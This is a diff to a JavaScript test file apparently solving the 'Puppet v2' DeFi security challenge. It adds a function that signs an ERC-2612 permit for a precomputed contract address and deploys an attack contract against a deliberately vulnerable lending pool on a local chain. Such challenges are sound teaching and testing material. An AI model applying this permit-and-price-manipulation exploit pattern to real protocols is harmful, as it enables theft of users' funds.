@@ -70,7 +70,7 @@ describe('[Challenge] Puppet v2', function () {
             (await ethers.provider.getBlock('latest')).timestamp * 2, // deadline
             { value: UNISWAP_INITIAL_WETH_RESERVE }
         )
-        uniswapExchange = await UniswapPairFactory.attach(
+        uniswapExchange = UniswapPairFactory.attach(
             await uniswapFactory.getPair(token.address, weth.address)
         )
         expect(await uniswapExchange.balanceOf(deployer.address)).to.be.gt(0)
@@ -102,6 +102,48 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        async function attackWithContract() {
+            const { signERC2612Permit } = require('eth-permit')
+            const attackContractAddress = ethers.utils.getContractAddress({
+                from: player.address,
+                nonce: await ethers.provider.getTransactionCount(player.address)
+            })
+            const { v, r, s } = await signERC2612Permit(
+                ethers.provider,
+                token.address,
+                player.address,
+                attackContractAddress,
+                PLAYER_INITIAL_TOKEN_BALANCE.toString()
+            )
+
+            const attackContractFactory = await ethers.getContractFactory(
+                'AttackPuppet_v2'
+            )
+            const bytecode = attackContractFactory.bytecode
+            const deployData = attackContractFactory.interface.encodeDeploy([
+                uniswapRouter.address,
+                lendingPool.address,
+                weth.address,
+                token.address,
+                v,
+                r,
+                s
+            ])
+            const gasCost = ethers.utils
+                .parseUnits('0.5', 9)
+                .mul('30000000')
+                .toBigInt()
+
+            const tx = {
+                to: null,
+                data: ethers.utils.hexConcat([bytecode, deployData]),
+                value: PLAYER_INITIAL_ETH_BALANCE - gasCost,
+                gasPrice: ethers.utils.parseUnits('0.5', 9),
+                gasLimit: 30000000n
+            }
+
+            await player.sendTransaction(tx)
+        }
         async function attack() {
             //swap token to eth
             const approveTx = {
@@ -154,7 +196,7 @@ describe('[Challenge] Puppet v2', function () {
 
             callTxs.forEach(async (tx) => await player.sendTransaction(tx))
         }
-        await attack()
+        await attackWithContract()
     })
 
     after(async function () {
